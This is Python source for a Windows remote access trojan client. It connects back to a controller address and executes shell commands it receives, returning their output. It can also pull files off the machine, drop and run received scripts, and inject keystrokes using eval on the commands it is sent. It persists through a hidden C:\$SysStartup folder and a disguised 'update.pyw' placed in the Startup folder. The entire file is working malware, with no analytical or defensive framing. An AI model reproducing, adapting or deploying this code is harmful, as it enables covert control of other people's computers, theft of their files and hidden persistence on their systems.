import socket as s
from subprocess import check_output, call
from time import sleep
from sys import exit
from random import randint
from os import getlogin
from os.path import exists
import threading

try:
    import pynput
    import mss
    import psutil
except ModuleNotFoundError:
    call(["pip", "install", "pynput"], shell=True)
    call(["pip", "install", "psutil"], shell=True)
    call(["pip", "install", "mss"], shell=True)

# change this to your ip and port:
HOST = "10.0.0.2"
PORT = 420
# -----------------------------------------
BUFFER = 4096
FORMAT = "cp850"
ADDR = (HOST, PORT)
from pynput.keyboard import Controller, Key

keyboard = Controller()

# the script for autostart
var = """import threading
from subprocess import call
import os
path = (pathlib.Path(__file__).parent.absolute())
chdir(path)
def a0001(): call(["python", "C:\$SysStartup\pslib.pyw"], shell=True)
a0001 = threading.Thread(target=a0001)
a0001.start()

"""
global client


# tries to reconnect after 30 secconds
def connector():
    try:
        global client
        client = s.socket(s.AF_INET, s.SOCK_STREAM)
        client.connect(ADDR)
        recvMsg()
    except (ConnectionRefusedError, TimeoutError, OSError):
        sleep(5)
        connector()


def sendMsg(msg):
    sendLength = str(len(msg)).encode(FORMAT)
    client.send(sendLength)
    client.send(msg.encode(FORMAT))
    recvMsg()


# receivs the commands
def recvMsg():
    try:
        # gets the length
        msgLen = client.recv(BUFFER).decode(FORMAT)
        if msgLen and not "":
            msgLen = int(msgLen)
            msg = client.recv(int(msgLen)).decode(FORMAT)
            process(msg)
    # returns to connector func if the connection is lost
    except (TimeoutError, ConnectionResetError):
        sleep(5)
        connector()


try:
    # processes the commands if sent
    def process(message):
        message = message.replace("\\\\", "\\")
        ctype = message[0]
        # if console command is sent
        if ctype == "c":
            messageLst = message.split(" ")
            mode = messageLst[1]
            messageLst.pop(0)
            messageLst.pop(0)

            # return the command output
            def comm():
                return check_output(messageLst, shell=True).decode(FORMAT)

            # doesent return the output
            def tComm():
                call(messageLst, shell=True)

            # checks if the command neds an output to be sent
            if mode == "o":
                try:
                    sendMsg(comm())
                except:
                    sendMsg("error")
                    recvMsg()
            else:
                threads = threading.Thread(target=tComm)
                try:
                    threads.start()
                    recvMsg()
                except:
                    sendMsg("error")
                    recvMsg()
        # accepts a sent file
        elif ctype == "f":

            # checks what type of file and what mode it uses
            msgNoType = message[1:]
            mode = msgNoType[3]
            msg = message[5:]
            fType = msgNoType[0:3].replace(' ', '')
            # generates the name of the file
            name = f"a{randint(100, 900)}.{fType}"
            # writes the file
            with open(f"{name}", "w") as fileObj:
                fileObj.write(msg)
            # checks if the script is only temporarry
            if mode == "A":
                # checks if the  the script is installes and returns an error if not
                if exists('C:/$SysStartup/temp'):
                    call(["move", f"{name}", "C:/$SysStartup/temp"], shell=True)
                    with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.pyw", "a") as obj:
                        if fType == "pyw":
                            obj.write(f'def {name[0:4]}(): call(["python", f"C:/$SysStartup/temp/{name}"], shell=True)\n')

                            def thread():
                                call(["python", f"C:/$SysStartup/temp/{name}"], shell=True)

                            start = threading.Thread(target=thread)

                        elif fType == "bat":
                            obj.write(f'def {name[0:4]}(): call([f"C:/$SysStartup/temp/{name}"], shell=True)\n')

                            def thread():
                                call([f"C:/$SysStartup/temp/{name}"], shell=True)

                            start = threading.Thread(target=thread)

                        elif fType == "ps1":
                            obj.write(f'def {name[0:4]}(): call(["powershell", f"C:/$SysStartup/temp/{name}"], shell=True)\n')

                            def thread():
                                call(["powershell", f"C:/$SysStartup/temp/{name}"], shell=True)

                            start = threading.Thread(target=thread)

                        obj.write(f'b{name[0:4]} = threading.Thread(target={name[0:4]})\n')
                        obj.write(f'b{name[0:4]}.start()\n')
                        start.start()

                    sendMsg(name)
                else:
                    sendMsg("err")
            else:
                call(["move", name, f"C:\\Users\\{getlogin()}\\AppData\\Local\\Temp"], shell=True)
                sendMsg(name)
        # reveive keybinds
        elif ctype == "k":
            # checks if this is a keybind
            if message[2] == "b":
                message = message[4:]
                keys = message.split(" ")
                # presses all keys
                for key in keys:
                    if key[0:3] == "Key":
                        keyboard.press(eval(key))
                    else:
                        keyboard.press(str(key))

                # releases all keys
                for release in keys:
                    if release[0:3] == "Key":
                        keyboard.release(eval(release))
                    else:
                        keyboard.release(str(release))

                recvMsg()
            elif message[2] == "s":
                key = message[4:]
                print(key)
                keyboard.press(eval(key))
                keyboard.release(eval(key))

                recvMsg()

            else:
                msg = message[4:]
                keyboard.type(msg)
                recvMsg()

        # retreives given files
        elif ctype == "r":
            path = message[2:]
            if exists(path):
                with open(f"{path}", "rb") as file:
                    string = file.read(2048)
                    while string:
                        client.sendall(string)
                        string = file.read(2048)
                sleep(0.5)
                client.send(b"done")
                recvMsg()
            else:
                client.send(b"err")
        # receives bytes
        elif ctype == "b":
            end = message[2:]
            name = f"a{randint(111, 999)}{end}"
            client.send(str(len(name)).encode())
            client.send(name.encode(FORMAT))
            file = client.recv(2048)
            while file:
                with open(f"{name}", "ab") as up:
                    up.write(file)
                if file[-4:] != b"done":
                    file = client.recv(2048)
                else:
                    print("awaiting path")
                    path = client.recv(2048).decode()
                    print(path)
                    if exists(str(path)):
                        print(f'move {name} {path}')
                        call([f'move', name, f'{path}'], shell=True)
                        sendMsg("succ")
                    else:
                        sendMsg("err")
        # installation procedure
        elif ctype == "x":
            # creates the needed folders
            call(["mkdir", "C:\\$SysStartup", "&&", "cd", "C:\\", "&&", "attrib", "+h", "C:\\$SysStartup", "/d", "&&", "mkdir", "C:\\$SysStartup\\temp"], shell=True)
            message = message[1:]
            # creates the shell script and moves it
            with open("pslib.pyw", "a") as libFile:
                libFile.write(message)
            call(["move", "pslib.pyw", "C:\\$SysStartup"], shell=True)
            # creates the autostart scirpt
            with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.pyw", "w") as updateFile:
                updateFile.write(var)
            recvMsg()
        else:
            # disconnects
            if message == "!dsc":
                client.close()
                exit()
except RecursionError:
    recvMsg()

connector()
